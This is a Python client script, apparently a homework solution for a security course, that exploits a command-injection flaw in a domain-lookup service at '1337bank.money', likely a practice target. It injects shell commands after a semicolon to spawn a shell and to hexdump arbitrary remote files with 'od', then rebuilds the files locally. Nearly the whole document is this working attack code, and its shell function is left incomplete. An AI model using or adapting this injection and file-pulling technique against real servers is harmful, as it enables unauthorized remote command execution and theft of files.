"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import os
import sys
import shlex
import socket
import codecs
import tempfile

host = "1337bank.money" # IP address here
port = 1337 # Port here

def print_usage():
    usage = ("\n"
             "\n"
             "Possible commands:\n"
             "\n"
             "1) shell                               Drop into an interactive shell and allow users to gracefully exit\n"
             "2) pull <remote-path> <local-path>     Download files\n"
             "3) help                                Shows this help menu\n"
             "4) quit                                Quit the shell\n"
             "\n")
    print(usage)

def do_shell():
    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    shell_cmd = b'> /dev/null; script -q /dev/null'
    s.send(shell_cmd)
    s.send(b'\n')

def do_pull(remote_path, local_path):
    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Verify connection
    msg = s.recv(35)
    if msg != b'Give me a domain or IP to look up:\n':
        print('Unexpected server response: ' + msg.decode('ascii'), file=sys.stderr)

    # Hexdump file
    shell_cmd = b'> /dev/null; od -xvAn'
    shell_cmd = (b'> /dev/null; od -xvAn --endian=big "' +
                 remote_path.encode('ascii') +
                 b'"; echo "%$?"\n')
    s.send(shell_cmd)
    s.send(b'\n')

    # Retrieve data
    with tempfile.NamedTemporaryFile() as tmpfile:
        ret_code = None
        new_data = s.recv(65536)

        # Check that we haven't reached the end of the data
        while len(new_data) > 0:
            # Check for illegal trailing data
            if ret_code is not None:
                print('Extraneous data found while pulling file!',
                      file=sys.stderr)

            # Remove whitespace
            hexdata = new_data.replace(b'\n', b'').replace(b' ', b'')

            # Check if separator character present
            if b'%' in hexdata:
                data_array = hexdata.rsplit(b'%')
                # Check that only 1 separator is present
                if len(data_array) != 2:
                    print('Extra seprator characters found while reading file',
                          file=sys.stderr)

                # Check that length of status code is > 0
                if len(data_array[1]) == 0:
                    data_array[1] = s.recv(65536).replace(b'\n', b'').replace(b' ', b'')
                    if len(data_array[1]) == 0:
                        print('Failed to read status code; '
                              'stream ended prematurely', file=sys.stderr)

                # Try to cast status code to integer
                try:
                    ret_code = int(data_array[1])
                except ValueError:
                    print('Non-integer value found for return code: ' +
                          data_array[1].decode('ascii'), file=sys.stderr)
                        
                # Verify status code is zero
                if ret_code != 0:
                    print('Non-zero status code returned',
                          file=sys.stderr)
                    
                hexdata = data_array[0]
                
            print('')
            print(hexdata)
            print('')
            tmpfile.file.write(codecs.decode(hexdata, 'hex_codec'))
            new_data = s.recv(65536)

        try:
            os.link(tmpfile.name, local_path)
        except FileExistsError:
            while True:
                print('The file \'' + local_path + '\' already exists. Do you want to overwrite? [yes/no]')
                line = sys.stdin.readline()
                response = line.strip()
                if response == 'yes':
                    print('\n')
                    os.unlink(local_path)
                    os.link(tmpfile.name, local_path)
                    return
                elif response == 'no':
                    print('\nPull aborted!')
                    return
                else:
                    print('\nPlease answer yes or no')
            


def execute_cmd(cmd):
    cmd_args = shlex.split(cmd)

    if cmd_args[0] == 'shell':
        # Check number of arguments
        if len(cmd_args) != 1:
            print_usage()
            return

        # Run shell
        do_shell()
        return

    elif cmd_args[0] == 'pull':
        # Check number of arguments
        if len(cmd_args) != 3:
            print_usage()
            return

        # Pull file
        do_pull(cmd_args[1], cmd_args[2])
        return

    elif cmd_args[0] == 'help':
        print_usage()
        return

    elif cmd_args[0] == 'quit':
        # Check number of arguments
        if len(cmd_args) != 1:
            print_usage()
            return

        # Exit
        sys.exit(0)

    else:
        print_usage()
        return

if __name__ == '__main__':
    print('> ', end='', flush=True)
    for line in sys.stdin:
        cmd = line.strip()
        execute_cmd(cmd)
        print('> ', end='', flush=True)
